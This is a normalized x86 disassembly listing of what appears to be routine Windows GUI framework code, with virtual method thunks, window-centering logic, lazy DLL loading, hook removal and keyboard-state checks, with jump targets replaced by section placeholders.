mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xa0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b0ba
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xa4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b114
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xa8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b16e
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xac ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b1c8
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x20 ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xb0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x1c
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b225
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xb4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b27f
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xb8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b2cd
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xbc ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b31b
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xc0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b375
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xc4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b3cf
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0x18 ]
lea esi [ ebp + 0x1c ]
push [ ebp + 0x14 ]
movsd [ edi ] [ esi ]
push [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xc8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x24
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b432
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x20 ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xcc ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x1c
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b48f
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x14 ]
mov eax [ esi ]
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov ecx esi
call [ eax + 0xd0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x10
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b4e3
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xd4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x14
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b53a
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xd8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b594
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xdc ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b5ee
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_407ef7
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_408504
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b636
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_407ef7
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_408575
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b67e
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_4085ca
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0xc
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b6cc
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xe0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b71a
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
lea ecx [ ebp - 0x8 ]
call sub_407ef7
cmp [ ebp - 0x4 ] 0x0
mov eax [ esi - 0x14 ]
mov [ edi ] eax
pop esi
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor eax eax
push [ ebp - 0x8 ]
push 0x0
call sub_4077c7
pop edi
leave
retn 0x8
sub_40b767
push ebp
mov ebp esp
sub esp 0x60
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_40ef1c
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x40000000
je r-xdata
mov edi [ eax + 0x20 ]
jmp r-xdata
push 0x4
push [ esi + 0x20 ]
call [ GetWindow@IAT ]
push [ esi + 0x20 ]
call [ GetParent@IAT ]
jmp r-xdata
push ebx
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x38 ]
push eax
push [ esi + 0x20 ]
call ebx
test [ ebp - 0x4 ] 0x40000000
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x20 ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x28 ]
push eax
push edi
call esi
push 0x2
lea eax [ ebp - 0x28 ]
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
add edi ecx
cmp edi [ ebp - 0x10 ]
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
cmp esi [ ebp - 0x14 ]
pop ebx
jge r-xdata
sub ebx [ ebp - 0x30 ]
add ebx [ ebp - 0x10 ]
mov ecx ebx
lea eax [ ebp - 0x28 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_409bc5
push eax
call sub_409c30
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_406fbc
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
mov eax [ ebp + 0x8 ]
add eax esi
cmp eax [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x30 ]
mov ebx [ ebp - 0x38 ]
add eax ecx
cdq
sub eax edx
mov ecx eax
sub edi ebx
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x1c ]
sar eax 0x1
sar ecx 0x1
sub ecx eax
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x24 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_409bc5
push eax
call sub_409c30
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x20 ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_40ef8c
pop edi
pop esi
leave
retn 0x4
mov esi [ ebp - 0x34 ]
sub esi [ ebp - 0x2c ]
add esi [ ebp - 0xc ]
sub_40b929
mov eax [ esp + 0x4 ]
mov [ ecx + 0x44 ] eax
mov eax [ ecx + 0x3c ]
test al 0x10
je r-xdata
retn 0x4
and eax 0xffffffef
mov [ ecx + 0x3c ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x20 ]
call [ PostMessageA@IAT ]
sub_40b94e
push 0x4
mov eax sub_420f3d
call sub_41021d
push 0x54
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_4102bc
retn
call sub_40ab18
sub_40b9a2
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
push [ esi + 0xc ]
call [ GetModuleHandleA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
push [ esi + 0xc ]
call [ LoadLibraryA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
setne al
mov [ esi + 0x8 ] al
sub_40b9d4
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop esi
retn 0x4
push r--data
call sub_40b9a2
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x10 ] eax
sub_40b9fe
push 0x14
push r--data
call sub_4106dc
mov esi ecx
and [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_410721
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
mov ecx esi
call sub_40b9d4
mov esi [ esi + 0x10 ]
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
call esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ba61
jmp sub_4054e9
sub_40ba72
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop esi
retn 0x4
push r--data
call sub_40b9a2
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x14 ] eax
sub_40ba9c
push 0x18
push r--data
call sub_4106dc
mov esi ecx
xor edi edi
mov [ ebp - 0x20 ] edi
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edi
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_40ba72
mov eax [ esi + 0x14 ]
xor ecx ecx
cmp eax edi
setne cl
cmp ecx edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bb11
mov eax [ ebp - 0x1c ]
call sub_4054e9
call sub_410721
retn 0x4
sub_40bb11
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] eax
sete al
mov esi eax
test esi esi
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push 0x0
call sub_4077c7
test esi esi
je r-xdata
sub_40bb62
push esi
push sub_405503
mov ecx rw-data
call sub_4076fc
mov esi eax
test esi esi
jne r-xdata
call [ GetMessageTime@IAT ]
mov [ esi + 0x68 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x70 ] eax
mov [ esi + 0x6c ] ecx
lea eax [ esi + 0x58 ]
pop esi
retn
jmp sub_4054e9
sub_40bba0
push esi
mov esi ecx
push sub_405503
mov ecx rw-data
call sub_4076fc
test eax eax
jne r-xdata
push [ eax + 0x64 ]
mov edx [ esi ]
push [ eax + 0x60 ]
mov ecx esi
push [ eax + 0x5c ]
call [ edx + 0x110 ]
pop esi
retn
jmp sub_4054e9
sub_40bbd0
push 0x0
mov eax sub_42117d
call sub_41021d
call sub_407ede
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_4102bc
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_40e653
call sub_4053cd
push 0x60
mov ebx eax
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x20
push sub_40f245
push sub_40b97b
push r--data
call sub_40ed0c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_4053cd
sub_40bc44
push esi
push edi
push 0x1
call sub_40bbd0
push [ esp + 0xc ]
mov esi eax
mov ecx esi
call sub_40ed95
mov edi eax
push esi
mov ecx edi
call sub_40efc8
mov eax edi
pop edi
pop esi
retn 0x4
sub_40bc85
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push esi
mov esi ecx
jne r-xdata
push edi
push 0x1
call sub_40bbd0
mov edi eax
push ebx
lea ecx [ edi + 0x1c ]
mov [ esi + 0x20 ] ebx
call sub_408a31
push edi
mov ecx esi
mov [ eax ] esi
call sub_40efc8
xor eax eax
inc eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_40bcbe
push esi
mov esi ecx
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
and [ esi + 0x50 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_40bbd0
test eax eax
je r-xdata
and [ esi + 0x20 ] 0x0
push [ esi + 0x20 ]
lea ecx [ eax + 0x1c ]
call sub_4088e6
sub_40bcec
push esi
push sub_405503
mov ecx rw-data
call sub_4076fc
mov esi eax
test esi esi
jne r-xdata
call sub_407eab
cmp [ eax + 0x14 ] 0x0
je r-xdata
jmp sub_4054e9
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x28 ] 0x0
sub_40bd37
push esi
mov esi ecx
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x4c ] 0x0
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push 0x0
push 0x0
push eax
call [ ecx + 0xc ]
mov ecx esi
pop esi
jmp sub_40bba0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40bd72
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov esi ecx
call sub_40878c
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x48 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x20 ] esi
jne r-xdata
mov ecx [ esi + 0x4c ]
xor ebx ebx
inc ebx
test ecx ecx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x48 ] ebx
cmp [ edi + 0x24 ] esi
jne r-xdata
call sub_407eab
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x4c ] 0x0
test [ esi + 0x3c ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x24 ] ebx
mov [ edi + 0x20 ] ebx
call sub_407eab
cmp edi [ eax + 0x4 ]
jne r-xdata
mov eax [ esi + 0x20 ]
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push eax
call edi
mov ecx esi
mov ebx eax
call sub_40bba0
mov eax [ esi + 0x20 ]
push 0xfffffffc
push eax
call edi
cmp eax ebx
jne r-xdata
call sub_407ede
mov edi [ eax + 0x3c ]
test edi edi
je r-xdata
push ebx
call sub_40f380
call sub_40f43a
test eax eax
je r-xdata
mov ecx esi
call sub_40bcbe
mov eax [ esi ]
mov ecx esi
call [ eax + 0x114 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x20 ]
call [ SetWindowLongA@IAT ]
push 0x30
lea eax [ ebp - 0x30 ]
push 0x0
push eax
call sub_4109d0
mov eax [ esi + 0x20 ]
add esp 0xc
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x405
push [ edi + 0x20 ]
mov [ ebp - 0x30 ] 0x28
mov [ ebp - 0x2c ] ebx
call [ SendMessageA@IAT ]
sub_40be83
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
push edi
call sub_40bbd0
cmp eax edi
jne r-xdata
cmp [ esi + 0x50 ] edi
jne r-xdata
push [ esi + 0x20 ]
lea ecx [ eax + 0x1c ]
call sub_4088a6
jmp sub_4054e9
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x50 ] edi
jne r-xdata
cmp [ esi + 0x50 ] edi
je r-xdata
mov eax [ esi + 0x20 ]
cmp eax edi
jne r-xdata
pop edi
pop esi
retn
mov ecx [ esi + 0x50 ]
mov eax [ ecx ]
call [ eax + 0x58 ]
push eax
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax edi
mov edi eax
sub_40bee0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
push sub_405503
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_4076fc
test eax eax
jne r-xdata
mov eax [ eax + 0x5c ]
lea ecx [ ebp - 0xc ]
push ecx
sub eax 0x132
push 0x0
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x19
mov ecx esi
call [ eax + 0x108 ]
pop esi
leave
retn 0x8
call sub_4054e9
sub_40bf2f
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40bf2f
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40bf2f
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
call sub_40bc6b
test eax eax
jne r-xdata
call sub_40bc44
jmp r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
sub_40bfa6
push esi
mov esi ecx
push sub_405503
mov ecx rw-data
call sub_4076fc
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ esi ]
push [ eax + 0x64 ]
mov ecx esi
push [ eax + 0x60 ]
push [ eax + 0x5c ]
call [ edx + 0x118 ]
pop esi
retn 0x4
call sub_4054e9
sub_40bfdc
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov ecx esi
call sub_40bba0
mov ecx [ esi + 0x4c ]
mov eax [ ecx ]
call [ eax + 0x90 ]
test eax eax
jne r-xdata
pop esi
retn 0x4
sub_40bfff
push ebx
push esi
push edi
mov ebx ecx
call sub_40ef1c
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_40bba0
neg eax
sbb eax eax
neg eax
call sub_406fbc
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
